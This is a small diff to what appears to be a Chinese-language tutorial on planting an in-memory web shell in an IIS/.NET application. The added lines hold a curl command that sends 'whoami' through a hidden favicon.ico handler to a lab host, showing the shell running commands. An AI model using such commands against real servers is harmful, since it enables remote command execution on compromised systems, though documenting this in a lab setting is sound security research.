@@ -474,6 +474,10 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /r:System.Web.dll,System
 
 3. 查看内存马命令执行效果
 
+``` bash
+curl http://192.168.186.135/favicon.ico -H "Type: cmd"  -d "pass=whoami"
+```
+
  - ![](./pics/memshell11.png)
  - ![](./pics/memshell12.png)
 
